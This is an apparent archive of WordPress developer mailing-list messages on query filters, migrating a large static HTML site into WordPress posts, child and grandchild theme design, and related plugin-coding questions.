There is an upload_mimes filter: 
http://codex.wordpress.org/Plugin_API/Filter_Reference/upload_mimes
However tuning it to be restrictive to specific CPT, let alone to a 
particular write box doesn't look possible without actual hacking.

Hi guys,
I need to join another table on WordPress comment sql query so that I can
have the data of the custom table. For posts, we can do by this "posts_join"
filter. How to do for comments? I dug into /wp-includes/query.php, but
didn't get any clue.

Is something like this possible?

 'post_status' => 'publish',
'meta_query' => array(
 array(
'key' => '_expiration_date',
'value' => '-1',
 'compare' => '='
),
array(
 'key' => '_expiration_date',
'value' => current_time('timestamp'),
 'compare' => '>='

 );

Seems like this should have been covered already but I can't find anything.

Hi,

I have a problem that I think this is in error .htaccess but i deleted the
file from the server and tried to make the WP and rebuilds it
unsuccessfully, for some reason does not create the WP .htaccess files
automatically when i change the structure permalinks. The folder is writable
...

Well, the problem is, the url of the site is www.dominio.com/blog and I'm
needing to pass value via get this: www.dominio.com/blog/?variable=1. The
problem is that whenever i use it '?'  it redirects to dominio.com/blog.
The. Htaccess now looks like this:

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /blog/index.php [L]

Removing the filter you suggested did not solve the problem, I'll install
the plugin to see if I'm successful.

That should work, By default it's AND'd together from memory.
However, It will cause a extra join per meta specification (ie. -1 will be 1
join, >= time will be another join).

Hate to say this, But sometimes the best way is to simply write a testcase,
just instantiate a new WP_Query, pass the args, and check WP_Query->request
(I think) for the SQL generated (or just dump the entire object), You should
be able to see pretty easily if the generated SQL has included both
conditions.

Subject: [wp-hackers] pulling a massive HTML site into Wordpress
Message-ID: <7A30C0F2-1626-4D09-8D96-6A35B4A1BDD3@gmail.com>

Hi there,

I have a gargantuan HTML based site I want to port to Wordpress. I'm talking 52,000 individual HTML pages, with a further 10,000 pages with minimal content (mostly pictures with captions) that are basically child pages of these main pages.

In addition to the 60,000 HTML pages in total, the site has around 52,000 images embedded across these pages.

Happily, there is some regularity across these pages, and it appears (from a quick look) that some elements (e.g., names of the authors, and extracts) could be ripped out along with the main content. Not all the archive is regularised, however. Site content goes back to 1998.

First, I know I'm going to need a solid strategy here. I kind of need help with that, for although I face this massive task, I'm actually a graphic designer, not a programmer.

I know I will need to design a Wordpress page or post structure to ultimately contain the various parts of these pages I want to rip.

But most of all, I need to know how to start.

1. I looked at the discussion had here on wp-hackers in February on "Porting static content". It gives a few leads, but I have questions.

2. I looked at the plugin Import HTML Pages. I need to look closer, but a first run attempt on a limited number of files failed. I'm working on a localhost MAMP set up.

3. The consensus from the earlier February discussion was that PHP Simple HTML DOM Parser (http://sourceforge.net/projects/simplehtmldom/) was a great tool. I looked it, but have no idea how to even start using this. I don't find documentation that speaks to someone as code illiterate as me. Can it be used on a localhost MAMP installation?

4. Someone else mentioned PhpQuery (http://code.google.com/p/phpquery/). I haven't the faintest idea how to use that either.

Basically, I need some kind of heads up here.

Can someone give a kind of overview of what is possible? Does anyone have any scripts they could share with me that might streamline this and save me from an impossible learning curve?

I include below some excerpts of the discussion in February. If anyone can elaborate further on some of that, I'd love to read more!


Thanks so much for reading, and sorry for not understanding code. My head works in another way.

best,
John Black

I've had good luck with that, and phpQuery.

http://code.google.com/p/phpquery/
phpQuery is a server-side, chainable, CSS3 selector driven Document
Object Model (DOM) API based on jQuery JavaScript Library

In our case, we first build a sitemap of the pages we wanted to
import. It's basically a hierarchy built as an mult-level, unordered
list. This allows us to maintain parent-child relationships between
pages when they are imported into WordPress. We loop over that
unordered list of links, scrape each page, and use phpQuery to select
different parts of the page based on jQuery selectors. We can also add
custom fields to these imported page using add_post_meta.

Scot, this sounds like a perfect use of the wp_insert_post() function


	$post = array(
	  'comment_status' => 'closed',
	  'ping_status' => 'closed',
	  'post_author' => $authorID,
	  'post_category' => $cat,
	  'post_content' => mysql_real_escape_string($_POST['post_content']),
	  'post_excerpt' => mysql_real_escape_string($_POST['post_excerpt']),
	  'post_status' => $blogpoststatus,
	  'post_title' => $posttitle,
	  'post_type' => 'post',
	  'tags_input' =>  $_POST['post_tags']
	);
	$wpid = wp_insert_post($post);


I did a government site a while back with similar restrictions, after downloading the content to a directory using an offline viewer I simply ran RegEx on the content until I had 50,000 usable documents. After that, I simply ran a PHP script to pull in 100 pages at time, post to the WP database and move those files.

Messages sorted by: [ date ] [ thread ] [ subject ] [ author ]
I wrote a simple plugin called Instant-Content-plugin
http://wordpress.org/extend/plugins/instant-content-plugin to import
static files into posts. It uses text files, but you can play with the
code to get that the way you want, commenting out the code that
replaces crlf with br tags. I made it so it can import data from a zip
file of static pages, using the first line of each file as a title.

I've used this to import large amounts of static data into WP. Most
recently I have been using it to import pages from my older sites into
WP. I had several sites with hundreds of pages of content that just
grew over the years. Each page had a slightly different layout. I
loaded all the pages into Notebook++ and made global changes until I
got just bare content. I then zipped up the files and loaded them into
WP pages using the instant-content plugin.

Scott. 

I've used http://sourceforge.net/projects/simplehtmldom/ a number of times. 

I'll send you a working script I use to suck down a site.

Well, if you don't know some PHP I don't know how you are going to do it,
but her is my advice.

1. Use http://simplehtmldom.sourceforge.net/ to pull content and from the
old site and map it accordingly to WordPress fields
2. Use a custom script to insert posts - like the one you quoted above that
makes use of wp_insert_posts() function
3. Import content e posts rather than pages as so much pages don't scale and
will kill your site

Good luck.

Kindly,

Yup sadly there is no way of doing this without hacking some PHP. But
Baki's instructions are entirely correct - you could do it as a
command line tool. I'm not sure about the latter instruction - posts
and pages, as far as the database is concerned, are basically the same
thing.

I did something similar not long ago, using Ruby to do it, for fun.

Right, but as fare as the Rewrite Engline for beautiful permalinks is
concerned, they are totally different things.

Posts is more what I need, so no problem there.

On the PHP hacking, I'm more than willing to try. But starting from zero is a big climb. In reality, I can barely get my head around HTML, never mind PHP! I wish there were step by step instructions out there! I'm a good soldier! I can follow orders!

I've heard of Ruby (*red face*). Would it help here?

Before getting down to the nitty gritty of the PHP hack, Is there any other path, say from HTML to X and then X to Wordpress that would be more doable?

Even using it is posing a problem. I'm not sure how it is used. I downloaded it, but it goes where, and how do I run it? The documentation that comes with it is clearly not written for total newbies like me.

I have a local archive of the site I need to port. The 50,000 HTML files are sectioned out across 14 main folders (by year), each containing 50 or so subfolders (by week). I want to do the port locally, so under MAMP.

How would the simple_html_dom.php script handle this?

It runs from within a browser?

(oh, I cringe too with my ignorance!)

Forgive me, but step one would create some kind of output per HTML file (stored where?) on which you run a script to pull it into an existing Wordpress installation?

Sorry to be confusing, Ruby is a totally different programming
language from PHP, just ignore me, if you don't know PHP this isn't
helpful to even mention it.

Sadly not, because HTML pages are in no standard format that a given
plugin could guess. The only possibility would be extracting the raw
text from the HTML, but because this is the sort of operation that
you'd have to do in a script anyway, and still then you'd need to
write something to add them all automatically to WordPress, then you
might as well cut out the middle man and parse the HTML directly.

Remember, in learning how to code a script then coding one, you'll
save time anyway, compared to copy and pasting anyway.

All the best,

Alex

Definitely. Cutting and pasting 50,000 HTML files is either the work of 1000 people like me, or it's a quick path to insanity for me alone.

So I need to: 1) find a script / working method to parse the HTML files so the content I need is separated out; 2) make sure I have my Wordpress post structure set up to render the content I need in the way I need it; 3) find a script / working method to take the parsed data, stored in whatever way it is stored, from 50,000 HTML files and input it into 50,000 new Wordpress posts, preserving dates, categories, authors, and other things I need aside from the main content.

I guess I have to get on top of PHP Simple, HTML DOM Parser first.

Hopefully others will have further clues!

Thanks for your replies so far.

best,
JB

I think it would be better if you hire someone to do the job. However,
if you have time and still want to do it yourself, learning html and
php (or any other programming language) is a must before trying to do
anything. :-)

SimpleDom isn't a program, its a library you pull into your PHP script.

A potential script would do this:

1. It would run on the command line.
2. The first few lines would draw all the required WordPress functions
in without loading a site. Also include HTMLDOM
define('WP_USE_THEMES', false);
require('wp-load.php');
You'd also need to require the html dom file also.
3. Then you'd parse the folders one by one using the PHP directory
functions http://php.net/manual/en/ref.dir.php
4. You'd then get to the file itself, you'd read it in using HTML Dom
$html = file_get_html($filename);
5. Then you'd use the library to extract the bits of the page by HTML
markup a bit like:
$content = $html->find('div[id=content]', 0)->innertext;
6. Finally you'd feed this into wp_insert_posts() filling in the title
and so on from further HTML extractions using the library
7. Loop over all your HTML files till this is done.

Would actually be fairly easy if they are in the same format.

Hope this is helpful,

All the best,

Alex

You're probably right, but sadly the people I want to help are totally broke. In fact, revamping their web presence is part of my effort to save them from looming bankruptcy. 

As for me, I never make it to the end of the month without being skint. It sucks. I'm not being paid to try to make this port. Maybe I'd get a thank you dinner out of it.

But given that you raise the point, I have two questions, out of interest:

1) Who would be able to do this?

2) How much would we be looking at to hack together the scripts I need?

I'm still hoping others can share scripts they've used to do the same, or give a few step by step pointers.

Thanks for your reply,

best,
JB

wow.

That is very helpful. I don't understand all of it, but it's a base to go on!

The HTML files are mostly the same. I'm worried about these child HTML files, however. Basically, if there was an inline picture in the main HTML files, the site has used child HTML files to put a big version of the picture with a caption. Somehow those would have to imported into the correct posts as featured images, with some sort of custom field for the caption.

Aside from that, the rest is pretty straightforward. The site is basically analysis or news. So has author, content, byline. Would need to be categorised with dates preserved. I'm not sure that there was any kind of tags. I think I saw a plugin that can auto create tags. The only other thing is that the site content was arranged by weekly output, and this needs to be preserved, somehow, into editions or issue numbers.

When you say command line, you're talking about Terminal, in OSX, right?

Thanks so much, Alex.

best,
JB

John, you'll need to do some programming no matter what but the core of what you need to do is fairly straight forward.

First, identify the content that you want to insert into WP. You can do this through something as simple as a RegEx search in Dreamweaver but at the end of the process you'll want to have 50,000 files that contain nothing except the content you want.

Next, write a small program in PHP that'll scan all the files in the directory and insert the code into WordPress. This code will loop files and can be easily modified for you - http://lab.revoke.ca/2009/04/php-loop-through-files-in-folder/ to include the code to insert the post with http://codex.wordpress.org/Function_Reference/wp_insert_post

Importing the posts into WP is easy, once you have the content ready to import.

Chris

Yes, you'd navigate to the directory of your webserver and run something like:
php migrate.php

You could pretty easily do the stuff with the includes intelligently
by getting the script to open up those files, read them then insert a
featured image. Everything is easy if you write it yourself - PHP
isn't that hard as languages go.

I appreciate the encouragement!

A question on the inserted featured image: Would that actually copy the image to the Wordpress install, or would the image be a path reference to the original file in the HTML archive folder?

Obviously at the end I hope to take the entire HTML archive, zip it, encrypt it, put it on a USB flash and bury it in the desert.

One other factor is that so far as the images go, there is no regular size or resolution. Also, some of the child pages contain more than one image, so I don't know how that would be handled when featured image tends to be singular.

best,
JB

Just to inject a counter argument here.. From what I've read, you're 
looking at a very large project that, because all the pages are 
inconsistent, would be difficult for skilled developers to complete 
successfully, on time and under a reasonable budget.

Your final end result - if you were able to complete the project 
successfully - would be a web site that produces the exact same results, 
except for being served by WordPress.

Before making such a heroic effort, I would ask myself if there aren't 
better ways my time could be spent to help save the company from 
bankruptcy... The problem with such a large project, is that if it is 
only partially completed, the results are probably worthless.  Other 
solutions may produce immediate tangible benefits.

Alex,

He says earlier that the pages are pretty consistent. If they are
pretty consistent, and even if their are minor difference, then this
isn't a problem really.

Hi Brian,

There's some inconsistency, but it's not total. I would estimate it that across the 50,000 HTML files, probably 80 per cent require ripping author, main body of written content, date, category and one image. But it's true that the 20 per cent that vary makes this 80 per cent more difficult to handle, as you basically want one script to do all the work, and not to have to sift through 50,000 files. This is the challenge, but I'm much encouraged by what Alex has said. One thing appears sure: no way I can do this alone. It needs the input, somehow, of a skilled PHP expert.

As for what else to help this organisation; if there was another way apparent I'd have done it. They need to get up to speed with contemporary web possibilities, including building readership and making their content better accessible, as well as integrated into social networking loops. Wordpress has come on in leaps and bounds in this direction since I first looked at it back in 2005. I just want to help them make the move so they can take advantage of some of that.

best,
JB

You don't really need an expert - ie someone who knows everything. You
just need someone basically competent.

Is this organization still producing content of some sort regularly? 
If so, you might better help them by getting them started today with 
posting new articles in a WordPress-based site. That will help them 
get into the search engines. Are they using other new media 
distribution paths, such as Twitter, Facebook, Flickr? Is the site 
showing up at all in Google? Maybe creating a sitemap for the old 
site, and ensuring that old articles are linked to when appropriate 
from the new site, would be a more useful use of your time and 
effort. Mike

It's a good point that if the site is well indexed on Google, you
should try and have consistency over the migration. But this can be
done by having a decent permalink structure to prevent 404s.

Hi Mike,

No one would be happier than me to take the easier route! haha But take my word for it, they need this port. So perhaps let's focus on discussion of how such a thing could be done, what strategies or tools can help in that, what pitfalls to look out for, etc. I don't say it's the only thing they need!

best,
JB

Good point. 

For example, the child HTML files would disappear completely. The need for them, it seems, comes from wanting to have a full resolution version of the photo they stem from, along with a description. This, hopefully, would be handled by Lightbox 2 under Wordpress.

There are 10,000 of these child pages, probably indexed by Google.

Aside from that problem, there would be a boat load of other old links that you'd want to have redirect to the new Wordpress posts. Given that there are 50,000 HTML files, this would probably necessitate some nifty work behind the scenes.

I see there are some plugins to handle 301 redirects. But these tend to be for a handful of files, not 50,000. Any thoughts on how this would managed?

I'd be storing a meta of their original file location when inserting them,
That way you can add a filter later to the 404/canonical handlers to check
the url against the meta fields to find the old document, and issue the 301.
Or, you could store the meta, retrieve it later to create a massive redirect
list, and feed that into .htaccess or similar.

How would you generate the meta? Some of the more recent HTML files have a note of the URL of the file embedded. But a quick check shows that the older files (as I say, the archive goes back to 1998) don't.

I was hoping to do the migration on a localhost install. To get the meta would I have to do the migration on the actual server of this organization?

JB

Can you share the site URL?  It might be easier to discuss if not talking about a site abstractly.

Subject: [wp-hackers] Is there a reason wp_localize_scripts doesn't handle
 multi-dimensional arrays?
Message-ID: <BANLkTi=AU_gzLwV6OF2VS2NfNk4U=gkPdw@mail.gmail.com>

I've been wondering for a while why wp_localize scripts handles json
encoding so awkwardly:

http://core.trac.wordpress.org/browser/trunk/wp-includes/class.wp-scripts.php#L50

Since WP3.2 now requires PHP 5.2 or higher, could this be rewritten to use
json_encode, and thus allow localization of multi-dimensional arrays? Each
value could still be mapped through esc_js, if necessary.

I'd be happy to submit a patch for it, just wondered if there was a reason
it hadn't been done yet.

And, cheers to whoever added the "Source File" section on the Codex page for
wp_localize_scripts. You've made me laugh on more than one occasion when
I've looked up that page.

Thanks Dion but I forgot to mention an important detail...

I'd like it to act like an OR statement.

Looks like I'll have to write a SQL.

Probably be more more efficient to filters posts_where and write some
SQL, but you could accomplish your goal using AND.

$args=array(
  'post_type' =>'special_stuff',
  'post_status' => 'publish',
  'meta_query' => array(
    array(
      'key' => '_expiration_date',
      'value' => array(0, current_time('timestamp')),
      'compare' => 'NOT BETWEEN'
    ),
    array(
      'key' => '_expiration_date',
      'value' => -1,
      'compare' => '>='
    )
  )
);

Have a nice day,
Jonathan

I wouldnt store the full url, rather, the url of that particular page. I
assumed the files you have, are in the same structure as the live files? If
so, I'd store (for example) /2008/directory_here/filename.html as the meta.

Not at all, Just only store the part of the url which matters.
Of course, If the files are live on the web in a different format/url
structure, you would need a way of mapping the live structure to the archive
files you have.

Message-ID: <28d450871236f261ff8e246db6fc78ad@elektroelch.de>

In times of theme frameworks child themes are not actually child themes 
anymore but "adult" themes using the framework, there is for example no 
actual "Genesis" theme but many, many derived themes.

Unfortunately it's impossible to create a child of them because they 
are already child themes themselves. Surely I could simply copy the 
whole theme and make changes there but that would contradict the 
established best practice of child themes not speaking of theme updating 
problems.

I'm aware that WordPress would need to take care of infinite theme 
loops, detection of grandparent and grand-grandparent and possible 
performance problems but I think it would be a good feature 
nevertheless.

Fair request.

I could share the URL one on one, on the clear understanding that my comments on-list are not publicly linked to the actual identity of this organization. I don't work for them in any capacity, but a friend does, and his efforts to help them might be compromised by my candid -- perhaps spoken out of turn -- assessment of their financial situation. 

You see, it's a somewhat visible news organization. I wish they had money to address their awful present web presence, but they don't. My friend is trying to help them in part because he's a Wordpress fan, and also because the state of the country the organization is in (it's a Third World country) is somewhat precarious and he wants to support its press.

Sounds complex, and it is. So I can share the URL with those who could help with the task, and with those who can commit to non-disclosure, so I can protect my friend.

Hope this stipulation is not too wierd.

best,
JB

Some of this is possible with a framework devised for that purpose. I use a theme framework that is very hook based for the development I do at Nicholls. For instance I use a primary child theme for most sites like http://www.nicholls.edu/events then I use an include in the functions.php file some other sub-sites themes. So the front end at http://www.nicholls.edu is a "home" theme based on the framework as a "template" with an include that sets up the base look from the primary theme. The styles.css in my "home" adds an additional performance hit, but keeps things a little organized.

So your idea is currently hackishly possible. I would think you might explore something like that. You might have to hack a purchased theme or request the author to make this implementation easier. 

Once upon a time developers had to take web apps like WordPress at face value. Before template systems you had to hack core php files. Then you had to track and merge changes from updates. I still occasionally have to make copies of perfectly good themes to extend them for the needs of my users and clients. Luckily, merging theme and plugin updates is so much nicer than those good ole days ;)

I can't speak for other companies, but we at StudioPress rarely update child
themes, and never really recommend you "upgrade" them. Genesis is the

meant to be edited. Usually, child themes are very simple, mostly just CSS

exceptions, and we're working on a solution for those, but for the most

Subject: [wp-hackers] limiting tag clouds to custom post type
Message-ID: <6485F14A-A86F-4B45-AD78-9341F6FC6F2B@gmail.com>

I've been looking for a way to generate a tag cloud limited specifically to a custom post type, but there doesn't seem to be a built-in method for doing this.

I found this:
http://wordpress.stackexchange.com/questions/14331/get-terms-by-taxonomy-and-post-type

But this seems to me to be incredibly inefficient since it's getting all the posts of the custom type from the database, then querying the database for each post to get its respective taxonomy.

Has anyone here attempted to figure out a means of doing the same thing that's more efficient?

Thanks,
Josh

Post types are part of the posts themselves. So you have to query
against the posts table.

The only "efficient" way to do it is going to be with a custom SQL
query. Join the posts table with term_relationships, term_taxonomy,
and terms, selecting based on the custom post type.

Something to consider: we decided against actively using Genesis because of this issue.  

I view it as a best practice not to modify other's packaged code (themes, plugins, core, etc..) Further, modifying a child theme means that we can't see our isolated changes separate from the shipped child theme.

Because of these issues we decided we can't use Genesis. Instead we use other themes where we can create a child theme of our own.

Take that as one market research data point. FWIW.

Mike,
If you feel like you have to segregate your mods, doing so is pretty simple
with the CSS @import and PHP include/require methods. You can be quite sure
that we're not going to be overwriting your entire child theme via an
automatic update of any sort.

What we NEVER want to do is be in the business of making those methods the
*standard* mode of modification. In our experience, abstracting the majority
of functionality and standard output into the parent theme, and leaving the
child theme to modify and style that output has been a near perfect balance
for our users. They feel like they're getting the benefits of a solid parent
(Genesis) with the ease of modification that comes with a more traditional
theme.

I was convinced that users would have a hard time with the Genesis concept,
but to my surprise, we've evidently stumbled on something that users really
love. My guess is that grandchild themes, or any attempt to synthesize that
concept, would disturb the balance of an otherwise extremely popular
methodology.

Justin,
We seriously considered this as a possible COA for Genesis, but decided
against it for the reasons I stated above.

Really it all comes down to a matter of preference.  Justin totally sold me
on *not* using "grandchild" themes quite a while ago.  But I still like the
Genesis model of using an advanced theme as the parent and building a child
theme based off it.  If StudioPress was pushing out rapid updates to their
child themes I'd be more concerned about that model, but I typically use one
of their themes as a base and build off it (with a different name so clients
don't accidentally break things *if* an update does come out).

A while ago I was a fervent advocate for grandchild themes.  I even started
putting together a patch for WP to allow it.  It wasn't until I got deep
into things that I realized just how bad of an idea it was.

Firstly, if we allow grandchild themes, why not great-grandchild themes?
 Once grandchild themes are on the table, you have to either limit it
somewhere or not limit it at all.  And once you allow for more than just a
parent-child relationship you run into other issues.

Say there's a bug on an archive page.  Is it caused by your grandchild
theme?  By the child theme?  By the parent theme?  By the framework that
ships with the parent theme?  Tracking down issues when multiple developers
and multiple development patterns are involved isn't just hard, it's nearly
impossible in some cases.

You also are stuck maintaining several separate systems on the site.  Rather
than just a theme, you have a theme, it's parent, and it's grandparent.  If
a client (user, paying customer, yourself) accidentally deletes or breaks an
ancestor of the active theme, you have problems.  On multi-user sites this
introduces a lot of potential instabilities into the system.

Finally comes distribution.  Right now, people are distributing both parent
themes and child themes.  If grandchild themes were allowed, I could see
people distributing those as well.  Imagine the confusion from an end-user
perspective if they were to purchase (or receive for free) a theme that
depends on another theme that depends on another theme that depends on
Genesis.

So while on the one hand I agree that it would be convenient to allow
grandchild themes, it would also introduce a whole slew of potential
nightmares that I doubt any of us would want to deal with.

Also, your proposed workflow of modifying a Genesis-based child theme
*isn't* going against best practices.  As Nathan pointed out, they're rarely
(if ever) updated and are mostly stylistic modifications of Genesis.  Think
of the child themes StudioPress sells more like starting points for your own
projects than standalone products.

@Nathan

I'm doing a bit of both methods.  There's definitely benefits and 
disadvantages to both.  Genesis works well because you guys avoid the 
need for child theme updates, which usually isn't too tough if you think 
ahead a little bit in development.  A lot of other theme "frameworks" 
just don't handle the future-proofing like you guys are doing.

------

The idea of "grandchild" themes is just too much.  There are levels upon 
levels of complexity with it.  It took a good two years or so for us to 
get the child theme movement going. :)

My preference is not to modify other's plugin or theme code unless absolutely not an option not too.  Modifying code breaks my development processes and my workflow that treat external versioned bits of code as sacred. I'm actually backing that "sacred" aspect into my automated processes.

But please just take my input as one data point, I may be the only one that thinks this way.  Or maybe there are many others who think the same way (although probably not many on this list) and if so you are eliminating those prospects as customers simply by your choice of architecture.  But yes, all things are trade-offs.

FWIW, I think that probably works really well for the segment of the market that selects themes for their own use or for the use of small budget projects. It probably does not work as well for larger budget projects where agencies are called in to build sites for larger organizations. Maybe the market you are serving is where you'll make the most money? (And I can't pretend to know what's best for your business.) 

But for my use-case where I use version control to manage projects and I segment my code from others it doesn't work. I only mention it as a data point for theming companies to consider.

What makes more sense to me would be to package a Genesis Framework with each of what you currently call Child Themes thus letting me create child themes from them.  Much like what Justin Tadlock wrote:

http://justintadlock.com/archives/2010/08/16/frameworks-parent-child-and-grandchild-themes

A theme could even "bootstrap" the framework into a shared location so that multiple framework-dependent themes could be installed and share the one framework.  But, that's just my two cents and since I'm not running StudioPress I understand that these ideas probably won't make it into your products, but maybe others who write theme frameworks will try them? FWIW.

I'm setting up several websites with WordPress that I need those to have one
session, so that users register to one site and are automatically
registered/logged in to all of them. I want to keep them separate for
database speed purpose and the content of the sites does not mix up.

So, my question is can I have those sites share the same register/login? Or
should I go the MS setup with hyperDB?

Thanks,

Baki Goxhaj

Subject: [wp-hackers] Compare "products"
Message-ID: <BANLkTinmmDB-cxo66h7eWaear0ZFt-z9bA@mail.gmail.com>

Hello People,

I'm writing a small "product" comparison system in WordPress and i'd like
your thoughts on this.
Here's what i've done so far.

1. Created a custom post type called "Products"
2. A custom page template where i list my products with a simple loop
wrapped in a <form> with a method=GET
3. In every product i have a checkbox field with a name of productIDs[] and
as a value i pass the the_ID();
4. In my functions.php i let WordPress know that i have a new query_var like
that:

*add_filter('query_vars', 'product_var' );*
*function product_var( $pvar )*
*{*
* **$pvar[] = 'productIDs';*
* **return $pvar;*
*}*

5. A new custom page template receives the vars through they query string
and creates a custom query like that:

*$products_to_compare = array();*
*foreach ($wp_query->query_vars['productIDs'] as $product) {*
* **$products_to_compare[] = $product;*
*}*
* $products_query = new WP_Query(array('post__in' =>
($products_to_compare)));*

Everything seems to be working just fine, but i have a couple of questions:

1. *$products_to_compare[] = $product;* Do i need to sanitize anything
around here? I mean i pull values from the URL.
2. Let's say that my products are displayed with pagination (e.g. 10
products per page). How could i keep the values of the checkboxes from
multiple pages? Cookies? Something else?

FWIW.

Just thinking out loud here...

Ideally, it should be a fairly straightforward mechanical process to
turn a child theme into a non-child by simply combining it with its
parent theme. Off the top of my head, this should work for almost all
cases:

1. Copy all files except style.css and functions.php from child to
parent, overwriting any dupes.

2. Copy child's functions from functions.php into parent's
functions.php. If naming conflicts arise, child function wins. If
designed properly, child should have no naming conflicts (don't use
pluggable functions folks, they're evil. Filters and action hooks work
better).

3. Copy rules from style.css into parent. Dropping them at bottom of
style.css should work. Imports of other style files can be copied,
just not the import of the parent's style file.

That should work for pretty much any child theme, I'd think. Perhaps
there's a few edge cases I missed.

Note: A "framework" is not a separate entity, nor would I consider it
one. I'd distinguish between a "framework" being "a starting point to
build a theme on top of" vs. a "parent theme" which is a theme that
you want to use but make minor modifications to via a child theme.
Frameworks have themes built on them, but they don't have that done
via child themes. And "minor" modifications is obviously debatable, as
with CSS you can completely change the entire look and feel of a theme
without touching one line of PHP code.

Note that while we don't currently allow child themes in the extend
repository, that's certainly coming eventually, so it's something that
will have to be worked out. I would consider that a child theme which
is too "complex" being rejected or told to become a non-child theme.
Child themes, ideally, should only be limited to "minor" (there's that
word again) modifications. This leaves ample room for an end user to
modify and adjust them as needed. Child themes wouldn't be updated
often, unless the parent changed in a breaking way. That sort of
thing. And if that did happen, then the child should become a parent.

It would be an interesting challenge, BTW, for somebody to develop
code that converted a child into a parent automagically. :)

This may sound overly pedantic (I am, after all, a self-avowed pedant), but
I would use the term "Stand Alone Theme" rather than "Parent Theme" in this
context. Technically *Any* fully functional (i.e. "Stand Alone") Theme can
act as a "Parent", but a Stand Alone Theme only becomes a "Parent" Theme if
some other Theme claims it as its template.

In other words, I would say that, in the scenario you describe, a developer
is requested to convert a Child Theme into a Stand Alone Theme, rather than
being requested to convert a Child Theme into a Parent Theme.

...and I wish more developers would adopt your usage of the term
"Framework", to refer to code on which a Stand Alone Theme is developed, but
which itself does not constitute a Stand Alone Theme. But that's another
topic entirely. :)

- I think you don't need to use foreach loop
on $wp_query->query_vars['productIDs'], because the 'post__in' parameter
accept an array for its value.

- And to be sure that the parameter is safe, you should sanitize it. Here's
my sample code:

$products_to_compare = get_query_var('productIDs');
$products_to_compare = array_map('intval', $products_to_compare);

$products_query = new WP_Query(array('post__in' => $products_to_compare));

I see. Yeah it works like this as well and i'd never thought of array_map :)
Thanx

Any ideas about the pagination?

Not entirely true. Some themes are Not Safe For Parent Use (NSFPU),
particularly those that willy-nilly mix TEMPLATEPATH and
STYLESHEETPATH.

Not ideal for Parent-Theme use, certainly - but certainly still *able* to be
used as a Parent Theme (especially for CSS-only changes).

But the misuse of
STYLESHEETPATH/TEMPLATEPATH/get_stylesheet_directory_uri()/get_template_directory_uri()
can be a real pain, and make a given Theme incredibly difficult to use as a
Parent.

FWIW, a "framework" is a "framework" whether it's a parent theme that
doesn't get modified, a drop-in folder within a standalone theme (which
doesn't get modified), or even in a plugin, really. In reality, WordPress
itself is a "theme framework", but it exists in a separate layer than the
currently active theme. Trying to define an object as a methodology seems
dumb to me.

Given that none of these are frameworks in the true programming sense, I'm
quite happy with that there's no formal standardization of that word in this
community.

My take: Child themes are inherently less stable. Grandchild themes would be
more so. I think the Genesis model is actually pretty nifty, as long as the
themes are written in such a way that there's no need to upgrade them. On
the other hand, I'm not sure that future features in WordPress wouldn't
require opt-in changes.

Actually, what you could do is rely on WP_Query's term caching abilities.

When WP_Query is run, it triggers three main queries: grabbing everything
relevant from wp_posts, wp_postmeta, and wp_terms/wp_term_taxonomy.

You could then loop through and calculate all of the term data -- which
would all be in cache -- and then build a tag cloud.

And all you're running is three queries at O(1) complexity. Much more
efficient than the code there, and more stable than a direct query.

Exactly as Nacin said.  The term "framework" has come to be used to describe so many things in the context of WordPress that the word is nothing more than "Marketecture" at this point.  Using the word now to describe anything related to WordPress is more likely to cause confusion than anything else.  FWIW.

Subject: [wp-hackers] Including custom post types on archive pages
Message-ID: <4DF071CE.1070802@philipwalton.com>

I'm writing a plugin that lists your site's archives in an easy-to-read 
format, grouped by month and year. I'm also adding an option to specify 
which of your site's archives existing post types to include in the 
archive list.

The problem is when I generate the link to the archives page (e.g. 
example.com/2011), unless the theme is already set up to query those 
custom post types, the user will only see posts of type 'post'.

My idea was to add query vars when my plugin generates the URL (e.g. 
example.com/2011/?post_type=post,page,book) and then use a filter or 
hook to add the specified post type(s) to the query.

My initial inclination was to use the 'posts_where' filter and then 
modify the actual SQL statement, but that seems like it could be pretty 
messy and possibly unreliable.

Can anyone recommend a good way to do this?

Maybe a query_posts in archive.php?

On pre_get_posts, do a $query->set( 'post_type', array( 'post', 'page',
'book' ) );

Subject: [wp-hackers] wrapping link name between span tags in blogroll
Message-ID: <4DF0C9E1.70802@gmail.com>

Hello,
using the standard blogroll widget I needed the link name to be wrapped 
in <span> tags while using link images, so I tried looking for a valid 
filter to do so but was unable to find it.
here's the standard output of the wp_list_bookmarks function used in the 
blogroll widget:

<li><a href=".."><img ... /> linkname</a></li>

and here's what I needed to achieve:

<li><a href=".."><img ... /><span class="link_name">linkname</span></a></li>


Since I couldn't find a clean way of achieving this I decided to have a 
look at wp-includes/bookmark-template.php and I made a few modifications.

here's the patch I've made, it's on pastebin so that you could have a 
look at it and tell me if it's worth submitting it to trac.

Danilo, it's generally a bad idea to edit the core files as you might lose the changes during an upgrade. A much better way to do it is to move the core functions into the functions.php or a plugin file and rename them for your specific needs. Chris

I would create a custom widget using get_bookmarks, so you could format it
that way.

Why do you need them wrapped in spans?

I ask because, generally speaking, when I see people saying "I need to
wrap X in a span/div/other", then that means that they need it for CSS
but don't know how to reference items in CSS without resorting to
modifying HTML.

Sometimes I'm wrong and there's a legit case. However, without knowing
your reasoning for the spans, then it's hard to say.

Not really.

pre_get_posts isn't a filter, it's an action where the query is passed by
reference. So there's no return value, and it's add_action rather than
add_filter.

Don't check for suppress_filters. You're doing that to make sure this isn't
a get_posts() call, rather than properly checking if this is the main query.
The is_admin() and is_preview() checks are superfluous, given the is_home()
and is_front_page() checks.

So, a few options: Use the parse_request or request filters, which only fire
on the main query. Or use $wp_the_query to confirm you're acting on the same
query.

So, Nacin, you're saying this wont work, because of the add_filter instead
of add_action?

function filter_search($query) {
    if ($query->is_search) {
$query->set('post_type', array('post', 'pages','books'));
    }
    return $query;
}
add_filter('pre_get_posts', 'filter_search');

No, it'll work, but by accident rather than design. :)

This would work just as well:

function filter_search($query) {
 ? ?if ($query->is_search) {
       $query->set('post_type', array('post', 'pages','books'));
 ? ?}
}
add_action('pre_get_posts', 'filter_search');

Is there a reason for not using WordPress Multisite for all sites? This
would make that what you seem to seek very easy to establish.

Hi,

In the past I created a setup for site with a nested structure in

I was wondering if this would still be the best method to use in
WordPress Multisite in order to achieve the nested blogs or pseudo

Thanks for your replies, I posted the diff because I thought it might 
have been a good suggestion for a modification of the core, it makes 
thing easier to customize, however I'm not going to modify a core file 
just for my needs as I usually tend to include what I need in my 
